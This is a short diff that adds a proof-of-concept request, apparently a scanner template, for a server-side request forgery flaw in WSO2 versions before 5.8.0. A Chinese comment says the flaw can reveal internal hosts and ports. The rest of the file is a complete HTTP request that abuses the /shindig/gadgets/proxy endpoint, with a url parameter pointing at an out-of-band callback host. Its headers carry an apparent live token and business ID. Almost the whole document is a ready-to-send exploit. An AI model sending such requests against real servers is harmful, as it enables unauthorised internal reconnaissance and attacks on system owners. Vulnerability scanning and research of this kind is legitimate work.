@@ -1,0 +1,9 @@
+# WSO2 服务器请求伪造漏洞
+# WSO2 <5.8.0 存在服务器端请求伪造漏洞，可用于识别内部主机和端口。
+GET /shindig/gadgets/proxy?container=default&url=http://oast.pro&acid=80001709&bid=hd_tag_m8mv25h3 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25h3
+RM-PRO-Token: 36d3a75feee745f59595b2cd7310f93e
+RM-PRO-Time: 1742808468246
+User-Agent: curl/7.83.1
+
